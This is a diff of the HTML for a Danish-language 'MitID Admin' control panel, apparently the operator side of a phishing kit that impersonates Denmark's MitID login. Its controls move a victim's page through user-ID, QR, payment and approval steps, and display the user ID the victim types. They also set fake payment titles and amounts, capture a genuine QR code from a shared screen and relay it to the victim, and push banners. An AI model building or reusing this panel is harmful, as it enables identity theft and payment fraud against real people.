@@ -10,14 +10,13 @@
 <style>
 @keyframes fadeSlideIn{0%{opacity:0;transform:translateY(8px)}100%{opacity:1;transform:translateY(0)}}
 .fade-slide{animation:fadeSlideIn .3s ease-out}
-@keyframes rtrSpin{to{transform:translate(-50%,-50%) rotate(360deg)}}
-.rtr-mini{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:20px;height:20px;border:3px solid #0060e6;border-top-color:transparent;border-radius:50%;animation:rtrSpin .8s linear infinite}
-.hidden-imp{display:none!important}
+input[type=text],input[type=url],input[type=password],input[type=number]{outline:none}
+.hidden{display:none!important}
 </style>
 </head>
 <body>
 
-<!-- ═══ LOGIN-SKÆRM (glass, præcis som original) ═══ -->
+<!-- LOGIN -->
 <div id="loginWrap" class="min-h-screen bg-gradient-to-br from-slate-50 via-white to-blue-50/30 flex flex-col items-center justify-center p-4 font-sans">
   <div class="w-full max-w-[400px] glass border-white/60 shadow-2xl shadow-black/5 border rounded-3xl p-10 relative overflow-hidden animate-scale-in">
     <div class="absolute -top-24 -right-24 w-48 h-48 rounded-full bg-blue-400/15 blur-3xl animate-float"></div>
@@ -25,121 +24,117 @@
     <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-64 h-64 rounded-full bg-indigo-400/5 blur-3xl"></div>
     <div class="relative text-center mb-10 animate-fade-in-up">
       <div class="inline-flex items-center justify-center w-20 h-20 rounded-2xl bg-gradient-to-br from-blue-500 to-indigo-600 mb-5 shadow-xl shadow-blue-500/25 animate-bounce-subtle">
-        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>
+        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>
       </div>
       <h1 class="text-2xl font-bold text-slate-900 tracking-tight">MitID Admin</h1>
       <p class="text-sm mt-2.5 text-slate-500">Log ind for at fortsætte</p>
     </div>
     <div class="relative space-y-5">
-      <div>
-        <input type="password" id="loginPassword" placeholder="Indtast adgangskode" class="w-full px-4 py-3.5 rounded-xl border-2 transition-all duration-200 border-gray-200 bg-gray-50 text-gray-900 placeholder-gray-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none text-base">
-      </div>
+      <input type="password" id="loginPassword" placeholder="Indtast adgangskode" class="w-full px-4 py-3.5 rounded-xl border-2 transition-all duration-200 border-gray-200 bg-gray-50 text-gray-900 placeholder-gray-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none text-base">
       <div id="loginCodeStep" class="hidden">
-        <div class="text-xs text-slate-600 bg-blue-50 border border-blue-200 rounded-lg px-3 py-2 mb-3" id="loginCodeMsg">Indtast koden fra Telegram</div>
+        <div class="text-xs text-slate-600 bg-blue-50 border border-blue-200 rounded-lg px-3 py-2 mb-3">Indtast koden fra Telegram</div>
         <input type="text" id="loginCode" placeholder="______" maxlength="6" inputmode="numeric" class="w-full px-4 py-3.5 rounded-xl border-2 border-gray-200 bg-gray-50 text-center text-2xl tracking-[.4em] outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 font-mono">
       </div>
-      <div class="login-error text-red-600 text-sm text-center hidden" id="loginError">Forkert adgangskode</div>
+      <div id="loginError" class="text-red-600 text-sm text-center hidden">Forkert adgangskode</div>
       <button id="loginBtn" class="w-full font-semibold text-[16px] py-3.5 px-4 rounded-xl transition-all duration-200 shadow-lg shadow-blue-600/20 bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-500 hover:to-blue-600 text-white hover:shadow-xl hover:shadow-blue-600/25">Log ind</button>
       <span class="text-[11px] text-center mt-2 block text-slate-400">Kun for autoriseret personale</span>
     </div>
   </div>
 </div>
 
-<!-- ═══ ADMIN-PANEL (efter login) ═══ -->
+<!-- ADMIN -->
 <div id="adminApp" class="min-h-screen bg-gray-900 hidden">
-  <!-- TOP TABS -->
   <div class="bg-gray-800 border-b border-gray-700 px-4">
-    <div class="flex gap-1">
-      <button class="px-4 py-3 text-sm font-medium transition-colors text-white border-b-2 border-blue-500" onclick="return false">🛡️ MitID Admin Panel</button>
+    <div class="flex gap-1 items-center">
+      <button class="px-4 py-3 text-sm font-medium text-white border-b-2 border-blue-500">🛡️ MitID Admin Panel</button>
+      <button id="logoutBtn" class="ml-auto px-3 py-1.5 text-xs text-gray-400 hover:text-white">Log ud</button>
     </div>
   </div>
-
-  <div class="max-w-[1200px] mx-auto p-6">
-    <div class="panel-head mb-6">
-      <h1 class="text-xl font-bold text-white">Kontrolpanel</h1>
-      <p class="text-sm text-gray-400 mt-1">Styr klient-siden — alle trin, QR og handlinger</p>
-    </div>
-
+  <div class="max-w-[1280px] mx-auto p-6">
+    <h1 class="text-xl font-bold text-white mb-1">Kontrolpanel</h1>
+    <p class="text-sm text-gray-400 mb-6">Styr klient-siden: trin, QR, beløb, besked, logs</p>
     <div class="grid grid-cols-1 lg:grid-cols-[1fr_380px] gap-5 items-start">
-
-      <!-- VENSTRE KOLONNE -->
       <div class="space-y-5">
 
-        <!-- KONTROL: kundens trin -->
+        <!-- TRIN KONTROL -->
         <div class="glass-dark border border-white/10 rounded-2xl p-5">
-          <h2 class="text-[15px] font-bold text-white mb-1">Kontrol — kundens trin</h2>
-          <p class="text-xs text-gray-400 mb-4">Styr direkte hvad klient-siden viser</p>
-          <div class="grid grid-cols-2 md:grid-cols-3 gap-2 mb-4">
-            <button id="flowBrugerBtn" class="p-3 rounded-xl border border-blue-500/50 bg-blue-500/10 text-blue-400 hover:bg-blue-500/20 font-semibold text-sm transition-colors flex items-center gap-2">
-              <span class="w-6 h-6 rounded-full bg-blue-500 text-white flex items-center justify-center text-xs font-bold">1</span> Bruger-ID
-            </button>
-            <button id="flowScanBtn" class="p-3 rounded-xl border border-cyan-500/50 bg-cyan-500/10 text-cyan-400 hover:bg-cyan-500/20 font-semibold text-sm transition-colors flex items-center gap-2">
-              <span class="w-6 h-6 rounded-full bg-cyan-500 text-white flex items-center justify-center text-xs font-bold">2</span> Vis QR
-            </button>
-            <button id="flowBetalingBtn" class="p-3 rounded-xl border border-violet-500/50 bg-violet-500/10 text-violet-400 hover:bg-violet-500/20 font-semibold text-sm transition-colors flex items-center gap-2">
-              <span class="w-6 h-6 rounded-full bg-violet-500 text-white flex items-center justify-center text-xs font-bold">3</span> Betaling
-            </button>
-            <button id="flowAnnullerBtn" class="p-3 rounded-xl border border-rose-500/50 bg-rose-500/10 text-rose-400 hover:bg-rose-500/20 font-semibold text-sm transition-colors flex items-center gap-2">
-              <span class="w-6 h-6 rounded-full bg-rose-500 text-white flex items-center justify-center text-xs font-bold">4</span> Annullering
-            </button>
-            <button id="flowWaitBtn" class="p-3 rounded-xl border border-amber-500/50 bg-amber-500/10 text-amber-400 hover:bg-amber-500/20 font-semibold text-sm transition-colors flex items-center gap-2">
-              <span class="w-6 h-6 rounded-full bg-amber-500 text-white flex items-center justify-center text-xs font-bold">5</span> Venter
-            </button>
-            <button id="flowApproveBtn" class="p-3 rounded-xl border border-emerald-500/50 bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20 font-semibold text-sm transition-colors flex items-center gap-2">
-              <span class="w-6 h-6 rounded-full bg-emerald-500 text-white flex items-center justify-center text-xs font-bold">6</span> Godkend Nu
-            </button>
+          <h2 class="text-white font-bold text-[15px] mb-1">Trin-kontrol</h2>
+          <p class="text-xs text-gray-400 mb-4">Klik for at skifte hvad klienten viser</p>
+          <div class="grid grid-cols-2 md:grid-cols-3 gap-2 mb-4" id="flowBtns">
+            <button data-flow="brugerid" class="flow-btn p-3 rounded-xl border border-blue-500/50 bg-blue-500/10 text-blue-400 hover:bg-blue-500/20 text-sm font-semibold flex items-center gap-2"><span class="w-6 h-6 rounded-full bg-blue-500 text-white flex items-center justify-center text-xs">1</span> Bruger-ID</button>
+            <button data-flow="scan" class="flow-btn p-3 rounded-xl border border-cyan-500/50 bg-cyan-500/10 text-cyan-400 hover:bg-cyan-500/20 text-sm font-semibold flex items-center gap-2"><span class="w-6 h-6 rounded-full bg-cyan-500 text-white flex items-center justify-center text-xs">2</span> Vis QR</button>
+            <button data-flow="betaling" class="flow-btn p-3 rounded-xl border border-violet-500/50 bg-violet-500/10 text-violet-400 hover:bg-violet-500/20 text-sm font-semibold flex items-center gap-2"><span class="w-6 h-6 rounded-full bg-violet-500 text-white flex items-center justify-center text-xs">3</span> Betaling</button>
+            <button data-flow="annuller" class="flow-btn p-3 rounded-xl border border-rose-500/50 bg-rose-500/10 text-rose-400 hover:bg-rose-500/20 text-sm font-semibold flex items-center gap-2"><span class="w-6 h-6 rounded-full bg-rose-500 text-white flex items-center justify-center text-xs">4</span> Annullering</button>
+            <button data-flow="wait" class="flow-btn p-3 rounded-xl border border-amber-500/50 bg-amber-500/10 text-amber-400 hover:bg-amber-500/20 text-sm font-semibold flex items-center gap-2"><span class="w-6 h-6 rounded-full bg-amber-500 text-white flex items-center justify-center text-xs">5</span> Venter</button>
+            <button data-flow="approved" class="flow-btn p-3 rounded-xl border border-emerald-500/50 bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20 text-sm font-semibold flex items-center gap-2"><span class="w-6 h-6 rounded-full bg-emerald-500 text-white flex items-center justify-center text-xs">6</span> Godkend</button>
           </div>
-          <div class="text-xs text-gray-400 bg-gray-800/50 border border-gray-700 rounded-lg px-3 py-2">Nuværende trin: <b class="text-white" id="flowCurrent">Bruger-ID</b></div>
-
-          <!-- Kundens indtastning -->
-          <div id="typedBox" class="mt-4 p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-lg hidden">
-            <div class="text-[11px] font-bold text-emerald-400 uppercase tracking-wider mb-1">Kundens indtastning</div>
-            <div class="text-lg font-mono font-bold text-white" id="typedBruger">—</div>
+          <div class="text-xs text-gray-400 bg-gray-800/50 border border-gray-700 rounded-lg px-3 py-2 mb-4">Trin: <b class="text-white" id="flowCurrent">Bruger-ID</b></div>
+          <div id="typedBox" class="hidden p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-lg">
+            <div class="text-[11px] font-bold text-emerald-400 uppercase mb-1">Kundens indtastning</div>
+            <div class="text-lg font-mono text-white" id="typedBruger">—</div>
           </div>
         </div>
 
-        <!-- EGEN HANDLING / BETALING -->
+        <!-- BELØB / BETALING -->
         <div class="glass-dark border border-white/10 rounded-2xl p-5">
-          <h2 class="text-[15px] font-bold text-white mb-1">Betaling / Handling</h2>
-          <p class="text-xs text-gray-400 mb-4">Skriv hvad kunden skal godkende</p>
-          <label class="text-[11px] font-bold uppercase text-gray-400">Presets</label>
-          <div class="flex flex-wrap gap-2 mb-4">
-            <button class="preset-chip px-3 py-1.5 rounded-full border border-blue-500/40 text-blue-400 text-xs font-semibold hover:bg-blue-500/10" data-preset-title="Slet denne betaling" data-preset-focus="actionAmount">🛒 Slet betaling</button>
-            <button class="preset-chip px-3 py-1.5 rounded-full border border-rose-500/40 text-rose-400 text-xs font-semibold hover:bg-rose-500/10" data-preset-title="Annullering af betaling" data-preset-focus="actionAmount">❌ Annullering</button>
-            <button class="preset-chip px-3 py-1.5 rounded-full border border-emerald-500/40 text-emerald-400 text-xs font-semibold hover:bg-emerald-500/10" data-preset-title="Bekræft betaling" data-preset-focus="actionAmount">✅ Bekræft</button>
-            <button class="preset-chip px-3 py-1.5 rounded-full border border-amber-500/40 text-amber-400 text-xs font-semibold hover:bg-amber-500/10" data-preset-title="Godkend login" data-preset-focus="none">🔐 Login</button>
+          <h2 class="text-white font-bold text-[15px] mb-1">Beløb / Betaling</h2>
+          <p class="text-xs text-gray-400 mb-4">Vælg hurtigt beløb eller indtast selv (DKK)</p>
+          <div class="grid grid-cols-6 gap-2 mb-3">
+            <button class="preset-chip px-2 py-1.5 rounded-lg border border-gray-600 text-gray-300 text-xs hover:border-blue-500" data-amount="99">99 kr</button>
+            <button class="preset-chip px-2 py-1.5 rounded-lg border border-gray-600 text-gray-300 text-xs hover:border-blue-500" data-amount="249">249 kr</button>
+            <button class="preset-chip px-2 py-1.5 rounded-lg border border-gray-600 text-gray-300 text-xs hover:border-blue-500" data-amount="499">499 kr</button>
+            <button class="preset-chip px-2 py-1.5 rounded-lg border border-gray-600 text-gray-300 text-xs hover:border-blue-500" data-amount="999">999 kr</button>
+            <button class="preset-chip px-2 py-1.5 rounded-lg border border-gray-600 text-gray-300 text-xs hover:border-blue-500" data-amount="1499">1499 kr</button>
+            <button class="preset-chip px-2 py-1.5 rounded-lg border border-gray-600 text-gray-300 text-xs hover:border-blue-500" data-amount="2499">2499 kr</button>
           </div>
-          <label class="text-[11px] font-bold uppercase text-gray-400">Handling</label>
-          <input type="text" id="actionTitle" placeholder="Slet denne betaling" maxlength="200" class="w-full px-3 py-2.5 rounded-lg border border-gray-700 bg-gray-800 text-white text-sm mb-3 outline-none focus:border-blue-500">
+          <label class="text-[11px] font-bold uppercase text-gray-400">Titel</label>
+          <input type="text" id="actionTitle" placeholder="Slet denne betaling" maxlength="200" class="w-full px-3 py-2.5 rounded-lg border border-gray-700 bg-gray-800 text-white text-sm mb-3">
           <div class="grid grid-cols-2 gap-3">
-            <div><label class="text-[11px] font-bold uppercase text-gray-400">Beløb</label><input type="text" id="actionAmount" placeholder="249,00 kr." maxlength="50" class="w-full px-3 py-2.5 rounded-lg border border-gray-700 bg-gray-800 text-white text-sm outline-none focus:border-blue-500"></div>
+            <div><label class="text-[11px] font-bold uppercase text-gray-400">Beløb (DKK)</label><input type="text" id="actionAmount" placeholder="249,00 kr." maxlength="50" class="w-full px-3 py-2.5 rounded-lg border border-gray-700 bg-gray-800 text-white text-sm outline-none focus:border-blue-500"></div>
             <div><label class="text-[11px] font-bold uppercase text-gray-400">Detalje</label><input type="text" id="actionDetail" placeholder="ref. ..." maxlength="400" class="w-full px-3 py-2.5 rounded-lg border border-gray-700 bg-gray-800 text-white text-sm outline-none focus:border-blue-500"></div>
           </div>
           <div class="flex gap-2 mt-3 items-center">
-            <button id="actionSendBtn" class="px-5 py-2.5 rounded-lg bg-gradient-to-r from-blue-600 to-blue-700 text-white text-sm font-semibold hover:from-blue-500">VIS PÅ KUNDESIDE</button>
-            <span class="save-msg text-emerald-400 text-xs opacity-0 transition-opacity" id="actionSaveMsg">Vist</span>
+            <button id="actionSendBtn" class="px-5 py-2.5 rounded-lg bg-gradient-to-r from-blue-600 to-blue-700 text-white text-sm font-semibold">VIS PÅ KUNDESIDE</button>
+            <button id="actionClearBtn" class="px-4 py-2.5 rounded-lg border border-gray-600 text-gray-300 text-sm">RYD BELØB</button>
+            <span id="actionSaveMsg" class="text-emerald-400 text-xs opacity-0 transition-opacity">Vist</span>
           </div>
           <div id="actionSvar" class="text-sm font-semibold mt-2"></div>
         </div>
 
+        <!-- BROADCAST BESKED -->
+        <div class="glass-dark border border-white/10 rounded-2xl p-5">
+          <h2 class="text-white font-bold text-[15px] mb-1">Broadcast Besked</h2>
+          <p class="text-xs text-gray-400 mb-4">Vis besked i banner øverst på klient-siden</p>
+          <div class="grid grid-cols-3 gap-2 mb-3">
+            <button class="broadcast-type px-3 py-2 rounded-lg border border-blue-500 bg-blue-500/10 text-blue-400 text-xs font-semibold" data-btype="info">🔵 Blå Info</button>
+            <button class="broadcast-type px-3 py-2 rounded-lg border border-gray-600 text-gray-400 text-xs font-semibold hover:border-emerald-500" data-btype="success">🟢 Grøn Succes</button>
+            <button class="broadcast-type px-3 py-2 rounded-lg border border-gray-600 text-gray-400 text-xs font-semibold hover:border-rose-500" data-btype="warning">🔴 Rød Advarsel</button>
+          </div>
+          <label class="text-[11px] font-bold uppercase text-gray-400">Besked-tekst</label>
+          <input type="text" id="broadcastText" placeholder="Skriv besked..." maxlength="200" class="w-full px-3 py-2.5 rounded-lg border border-gray-700 bg-gray-800 text-white text-sm mb-3">
+          <div class="flex gap-2">
+            <button id="broadcastSend" class="px-4 py-2.5 rounded-lg bg-blue-600 text-white text-sm font-semibold">SEND</button>
+            <button id="broadcastClear" class="px-4 py-2.5 rounded-lg border border-gray-600 text-gray-300 text-sm">RYD</button>
+          </div>
+        </div>
+
         <!-- STATUS & QR -->
         <div class="glass-dark border border-white/10 rounded-2xl p-5">
-          <h2 class="text-[15px] font-bold text-white mb-1">Status &amp; QR</h2>
-          <p class="text-xs text-gray-400 mb-4">Live/offline og QR-mål</p>
+          <h2 class="text-white font-bold text-[15px] mb-1">Status &amp; QR</h2>
           <div class="flex items-center gap-2.5 mb-4">
-            <span class="dot w-2.5 h-2.5 rounded-full bg-gray-500 inline-block" id="statusDot"></span>
+            <span class="w-2.5 h-2.5 rounded-full bg-gray-500" id="statusDot"></span>
             <span class="text-sm text-gray-300" id="statusText">Offline</span>
-            <button id="liveToggle" class="ml-auto px-3 py-1.5 text-xs font-semibold border border-blue-500 text-blue-400 rounded-md hover:bg-blue-500/10">SÆT LIVE</button>
+            <button id="liveToggle" class="ml-auto px-3 py-1.5 text-xs font-semibold border border-blue-500 text-blue-400 rounded-md">SÆT LIVE</button>
           </div>
           <label class="text-[11px] font-bold uppercase text-gray-400">QR-mål</label>
-          <input type="url" id="qrTarget" placeholder="https://..." class="w-full px-3 py-2.5 rounded-lg border border-gray-700 bg-gray-800 text-white text-sm mb-3 outline-none focus:border-blue-500">
-          <div class="grid grid-cols-2 gap-3">
-            <div><label class="text-[11px] font-bold uppercase text-gray-400">Session</label><input type="text" id="sessionId" readonly class="w-full px-3 py-2 rounded-lg border border-gray-700 bg-gray-900 text-gray-400 text-sm"></div>
-            <div><label class="text-[11px] font-bold uppercase text-gray-400">Opdateret</label><input type="text" id="lastUpdated" readonly class="w-full px-3 py-2 rounded-lg border border-gray-700 bg-gray-900 text-gray-400 text-sm"></div>
+          <input type="url" id="qrTarget" placeholder="https://..." class="w-full px-3 py-2.5 rounded-lg border border-gray-700 bg-gray-800 text-white text-sm mb-3">
+          <div class="grid grid-cols-2 gap-3 mb-3">
+            <div><label class="text-[11px] font-bold uppercase text-gray-400">Session</label><input type="text" id="sessionId" readonly class="w-full px-3 py-2 rounded-lg bg-gray-900 border border-gray-700 text-gray-400 text-sm"></div>
+            <div><label class="text-[11px] font-bold uppercase text-gray-400">Opdateret</label><input type="text" id="lastUpdated" readonly class="w-full px-3 py-2 rounded-lg bg-gray-900 border border-gray-700 text-gray-400 text-sm"></div>
           </div>
-          <div class="flex gap-2 mt-3">
-            <button id="saveBtn" class="px-4 py-2.5 rounded-lg bg-blue-600 text-white text-sm font-semibold hover:bg-blue-500">GEM</button>
-            <button id="newSessionBtn" class="px-4 py-2.5 rounded-lg border border-gray-600 text-gray-300 text-sm font-semibold hover:bg-gray-800">NY SESSION</button>
+          <div class="flex gap-2">
+            <button id="saveBtn" class="px-4 py-2.5 rounded-lg bg-blue-600 text-white text-sm font-semibold">GEM</button>
+            <button id="newSessionBtn" class="px-4 py-2.5 rounded-lg border border-gray-600 text-gray-300 text-sm">NY SESSION</button>
           </div>
           <div class="grid grid-cols-2 gap-3 mt-4">
             <div><label class="text-[11px] font-bold uppercase text-gray-400">Scans</label><input type="text" id="statTotal" readonly class="w-full px-3 py-2 rounded-lg bg-gray-900 border border-gray-700 text-emerald-400 text-sm"></div>
@@ -149,10 +144,9 @@
 
         <!-- CAPTURE -->
         <div class="glass-dark border border-white/10 rounded-2xl p-5">
-          <h2 class="text-[15px] font-bold text-white mb-1">Capture — aflæs QR</h2>
-          <p class="text-xs text-gray-400 mb-4">Del skærm → QR aflæses (60ms) → push til klient</p>
+          <h2 class="text-white font-bold text-[15px] mb-1">Capture — aflæs QR</h2>
           <div class="flex items-center gap-2.5 mb-3">
-            <span class="dot w-2.5 h-2.5 rounded-full bg-gray-500" id="captureDot"></span>
+            <span class="w-2.5 h-2.5 rounded-full bg-gray-500" id="captureDot"></span>
             <span class="text-sm text-gray-300" id="captureStatusText">Stoppet</span>
             <button id="capturePushToggle" class="ml-auto px-3 py-1.5 text-xs font-semibold border border-gray-600 text-gray-400 rounded-md">PUSH: FRA</button>
           </div>
@@ -167,36 +161,23 @@
             <button id="captureStopBtn" class="px-4 py-2.5 rounded-lg border border-gray-600 text-gray-300 text-sm hidden">STOP</button>
           </div>
           <div class="text-red-400 text-xs mt-2" id="captureErr"></div>
-          <hr class="my-4 border-gray-700">
-          <label class="text-[11px] font-bold uppercase text-gray-400">Eller hent fra URL</label>
-          <input type="url" id="captureSourceUrl" placeholder="https://..." class="w-full px-3 py-2.5 rounded-lg border border-gray-700 bg-gray-800 text-white text-sm mb-2">
-          <div class="flex gap-2">
-            <button id="captureFetchNowBtn" class="px-3 py-2 rounded-lg border border-gray-600 text-gray-300 text-xs">HENT</button>
-            <button id="captureSaveUrlBtn" class="px-3 py-2 rounded-lg border border-gray-600 text-gray-300 text-xs">GEM</button>
-            <button id="captureAutoToggle" class="px-3 py-2 rounded-lg border border-blue-500 text-blue-400 text-xs font-semibold">AUTO: FRA</button>
-          </div>
-          <div class="text-red-400 text-xs mt-2" id="captureUrlErr"></div>
         </div>
 
         <!-- INDSTILLINGER -->
         <div class="glass-dark border border-white/10 rounded-2xl p-5">
-          <h2 class="text-[15px] font-bold text-white mb-1">Indstillinger</h2>
-          <p class="text-xs text-gray-400 mb-4">Offline-tekst + rotation</p>
+          <h2 class="text-white font-bold text-[15px] mb-1">Indstillinger</h2>
           <label class="text-[11px] font-bold uppercase text-gray-400">Offline titel</label>
           <input type="text" id="offlineTitle" placeholder="Ingen aktiv session" class="w-full px-3 py-2.5 rounded-lg border border-gray-700 bg-gray-800 text-white text-sm mb-3">
           <label class="text-[11px] font-bold uppercase text-gray-400">Offline tekst</label>
           <input type="text" id="offlineBody" placeholder="Kom tilbage senere" class="w-full px-3 py-2.5 rounded-lg border border-gray-700 bg-gray-800 text-white text-sm mb-3">
-          <div class="flex gap-2 mb-4">
-            <button id="saveSettingsBtn" class="px-4 py-2.5 rounded-lg bg-blue-600 text-white text-sm font-semibold">GEM</button>
-            <span class="save-msg text-emerald-400 text-xs" id="settingsSaveMsg">Gemt</span>
-          </div>
+          <button id="saveSettingsBtn" class="px-4 py-2.5 rounded-lg bg-blue-600 text-white text-sm font-semibold mb-4">GEM</button>
           <hr class="border-gray-700 my-3">
           <div id="rotateMount"></div>
         </div>
 
       </div>
 
-      <!-- HØJRE: PREVIEW -->
+      <!-- PREVIEW -->
       <div class="sticky top-5">
         <div class="glass-dark border border-white/10 rounded-2xl p-5">
           <div class="flex justify-between items-center mb-2">
@@ -204,7 +185,7 @@
             <img src="/assets/mitid-logo.png" alt="MitID" style="height:18px;">
           </div>
           <hr class="border-gray-700 my-3">
-          <div class="text-[11px] font-bold uppercase text-gray-400 mb-3">QR-kode</div>
+          <div class="text-[11px] font-bold uppercase text-gray-400 mb-3">Preview</div>
           <div id="previewQrBox" class="hidden">
             <div id="qrcode" class="w-[200px] h-[200px] mx-auto bg-white p-3 rounded border border-gray-600"></div>
             <div class="text-xs text-gray-400 text-center mt-2" id="previewMsg"></div>
